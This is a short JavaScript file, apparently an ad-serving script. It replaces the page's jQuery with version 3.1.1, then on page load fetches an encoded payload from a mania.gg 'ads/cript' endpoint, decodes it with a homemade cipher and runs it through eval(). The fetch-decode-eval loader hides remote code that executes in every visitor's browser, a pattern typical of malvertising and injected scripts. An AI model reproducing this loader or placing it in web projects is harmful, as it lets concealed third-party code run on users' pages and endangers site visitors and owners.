var changejQuery = false;
if (typeof jQuery != 'undefined' && jQuery.fn.jquery != "3.1.1") {
    jQuery('body').append('<script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>');
    changejQuery = true;
}

function Decrypt(s1, id) {
    s1 = atob(s1);
    var result = '';
    var xx2 = s1.charAt(0);
    var val = '';
    var val1 = '';
    var val2 = '';
    xx2 = xx2.charCodeAt(0) - 65;
    s1 = s1.substr(1);
    while(s1.length > 0) {

        result = result + String.fromCharCode(
            (
                s1.charAt(0).charCodeAt(0) - 65
            )
            * 25 +
            (
                s1.charAt(1).charCodeAt(0) - 65
            )
            - xx2 - id
        );

        s1 = s1.substr(2);

    }
    return result;
}

window.onload = function(e){
    if(changejQuery){
        jQuery3 = jQuery.noConflict(true);
    }else{
        jQuery3 = jQuery.noConflict();
    }
    jQuery3.get("https://www.mania.gg/api/ads/cript/" + requestJS, function(data){
        eval(Decrypt(data,1745));
    });
}